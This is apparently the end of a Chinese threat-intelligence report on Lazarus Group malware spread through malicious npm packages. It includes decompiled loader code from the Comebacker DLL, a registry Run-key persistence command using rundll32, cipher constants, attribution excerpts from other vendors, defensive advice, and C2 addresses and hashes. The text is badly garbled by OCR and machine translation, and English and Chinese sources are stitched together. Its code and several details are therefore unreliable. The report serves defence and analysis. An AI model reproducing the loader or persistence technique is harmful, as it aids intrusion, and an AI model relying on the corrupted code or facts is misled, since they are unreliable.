+v8[3]=0164; VirtualAlloc(v6, \*((unsigned int \*)v5 $^+$ 20),0x1000u, 4u); v9 $=$ (char \*)VirtualAlloc(v6,\*(unsigned nt\*）5+21)x100ou，4u）; memmove(v9.Src.(Unsigned int)（\*（（-DWORD \*)Src+15)+\*（(DWORD\*)v5+21); V10 &v9[\*((int \*)Src + 15)]; \*v8=v10; \*((_QWORD'\*)v10 + 6) = V6; sub_180001000(Src, v5,v8); V11 =(char\*)(v6 -(-BYTE \*)v5[6]); if ( v6 1=v5[6] ) sub_180001200(v8,v11); if ((unsigned int)sub_1800012B0(v8, v11)) sub-_100010F0(v8); v12 =\*(unsianed int \*)(\*v8 + 40t64); if （!(DWORD)V12) return (char \*)v8; V13 = &v6[v12]; if (v13 && ((unsigned int (-_fastcall \*)(char \*,-_int64, -_int64))v13)(v6, 1i64, a2) ) \*((_DWORD \*)v8 + 7) = 1; return (char \*)v8; } sub_1800015E0(v8); result $=$ 150(v8); Comebacker DLL   
+return result; MD5:9e9f69ed56482ff18933c5ec8612063  
+
+执行方式同样是rundll32调用DLL的导出函数，并查找数字字符串（ $"2907"$ ）作为参数，而且DLL的导出函数ASN2_TYPE_new为空，ASN2_TYPE_newW函数实现恶意功能。  
+
+HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SSL Update  
+
+'C:\Windows\System32\rundll32.exe   
+C:\ProgramData\VirtualBox\update.bin,ASN2_ TYPE_new 5I9YjCZ0xlV45Ui8   
+2907"  
+
+<html><body><table><tr><td>ASN2TYPEnew</td><td>00000001800038C0 1</td></tr><tr><td>ASN2TYPEnewW</td><td>00000001800038D0 2</td></tr><tr><td>DIIMain</td><td>00000001800038E0 3</td></tr><tr><td>DllEntryPoint</td><td>0000000180017080 [main entry]</td></tr></table></body></html>  
+
+关联到的木马样本1c4227bf06121fe9c454a85ad9245b56在解密字符串时使用A5加密算法，其中常量0xFE268455，0xC2B45678，0x90ABCDEF也出现在Lazarus的历史攻击样[4]本中。  
+
+$\mathsf{v}4\mathsf{\Omega}=$ (unsigned int)(a2 / 3);   
+$\vee5=$ 0xFE268455;   
+a1[5] $=$ 0xFE268455;   
+v6 $=$ a2-3\*v4;   
+result $\l=$ 0xC2B45678i64;   
+a1[3] $=$ 0xC2B45678;   
+V8 =0x90ABCDEF;   
+a1[4] $=$ 0X90ABCDEF;   
+if((int)v $4>0$  
+
+O prtspoo1 (SHA-l: 58B0516D28BD7218B1908FB266B8FE7582E22A5F), which shoWS c0de similarities t0 sysnetd (see Figure 5). It was attributed to Lazarus by CISA in February 202l. Note as well that SIMPLESEA, a macOS backdoor found during the 3CX incident response, implements the A5/1 stream cipher.  
+
+  
+Figure 5. Similarities between Applejeus for macOS and the Linux variant of BADCALL (the key for the A5/I stream cipher)  
+
+[5]今年7月，Github官方发布安全警告”，攻击者借助Github仓库和恶意npm包展开行[1] [7]动，攻击手段与Phylum报告”“类似。在微软的报告”‘中提到，Jade Sleet是拉撒路的别名。  
+
+2023年7月18日  
+
+  
+
+GitHub发现了一个小规模的社会工程活动，  
+该活动针对科技公司员工的个人帐户，结合使用存储库邀请和恶意npm包依赖项。许多目标账户都与区块链、加密货币或在线赌博行业相关。一些目标也与网络安全部门有关。在此活动中，没有GitHub或npm系统受到损害。我们发布这篇博文是为了警告我们的客户，  
+防止被该威胁行为者利用。  
+
+## 威胁参与者资料  
+
+我们高度确信该活动与一个支持朝鲜目标的组织有关，  
+该组织被微软威胁情报部门称为"Jade Sleet"，被美国网络安全和基础设施安全局(CISA)称为"TraderTraitor"。JadeSleet  
+主要针对与加密货币和其他区块链相关组织相关的用户，  
+但也针对这些公司使用的供应商。  
+
+### GitHub内部通讯  
+
+# North Korean groups exhibit more sophisticated operations through cryptocurrency theft and supply chain attacks  
+
+Microsoft assesses that North Korean activity groups are conducting increasingly sophisticated operations through cryptocurrency theft and supply chain attacks. In January 2023, the Federal Bureau of Investigation (FBl) publicly attributed the June 2022 theft of $\$100$ million in cryptocurrency from Harmony's Horizon Bridge to Jade Sleet (DEV-0954), a.k.a. Lazarus Group/APT38.33 Furthermore, Microsoft attributed the March 2023 3CX supply chain attack that leveraged a prior supply chain compromise of a US-based financial technology company in 2022 to Citrine Sleet (DEV-0139). This was the first time Microsoft has observed an activity group using an existing supply chain compromise to conduct another supply chain attack, which demonstrates the increasing sophistication of North Korean cyber operations.  
+
+## I总结  
+
+批量下载器样本的多层隐藏加载方式和C&C通信可以明显看出攻击者在尝试攻击痕迹，减少后续线程带来的风险。由于恶意软件牵涉到npm包供应链攻击，相关攻击活动可以追溯到今年7月之前，受此影响的人员数量可能会大量，再加上与Lazarus组织存在关联，意味着攻击者很可能以此为基础展开进一步的攻击行动。  
+
+## I防护建议  
+
+奇安信威胁情报中心提醒广大用户，谨防钓鱼攻击，打开社交媒体分享的来历不明的链接，不点击执行未知来源的邮件附件，不运行标题夸张的未知文件，不安装非正规途径来源的APP。做到及时备份重要文件，更新安装补丁。  
+
+若需运行，安装来历不明的应用，可先通过奇安信威胁情报文件深度分析平台（https://sandbox.ti.qianxin.com/sandbox/page）进行判别的。目前已支持包括Windows、Android平台在内部的多种格式文件深度分析。  
+
+目前，基于奇安信威胁情报中心的威胁情报数据的全线产品，包括奇安信威胁情报平台（TIP）、天擎、天眼高级威胁检测系统、奇安信NGSOC、奇安信威胁情报等，都已经支持了这一点类攻击的准确检测。  
+
+## I国际奥委会  
+
+### MD5  
+
+d8a8cc25bf5ef5b96ff7a64f663cbd29 46127a35b73b714a9c5c58aaa43cb51f a6e7c231a699d4efe85080ce5fb36dfb 7298b1f10ee6afab5e8bf648be1ca13b 420a13202d271babc32bf8259cdaddf3 1c4227bf06121fe9c454a85ad9245b56 指令与指令 91.206.178.125:80 156.236.76.9:80 区块链newtech.com chaingrown.com  
+
+### 网址  
+
+hxxp://91.206.178.125/upload/upload.asp   
+hxxps://blockchain-newtech.com/download/download.asp   
+hxxps://chaingrown.com/manage/manage.asp   
+hxxp://156.236.76.9/faq/faq.asp   
+hxxp://103.179.142.171/npm/npm.mov   
+hxxp://103.179.142.171/files/npm.mov   
+hxxp://91.206.178.125/files/npm.mov  
+
+## I参考链接  
+
+[1].https://blog.phylum.io/crypto-themed-npm-packages-found-delivering-stealth   
+y-malware/   
+[2].https://www.attackify.com/blog/rundll32_execution_order/   
+[3].https://www.microsoft.com/en-us/security/blog/2021/01/28/zinc-attacks-again   
+st-security-researchers/   
+[4].https://www.welivesecurity.com/2023/04/20/linux-malware-strengthens-links-l   
+azarus-3cx-supply-chain-attack/   
+[5].https://github.blog/2023-07-18-security-alert-social-engineering-campaign  
+targets-technology-industry-employees/   
+[6].https://blog.phylum.io/junes-sophisticated-npm-attack-attributed-to-north  
+korea/   
+[7].https://query.prod.cms.rt.microsoft.com/cms/api/am/binary/RW1aFyW  
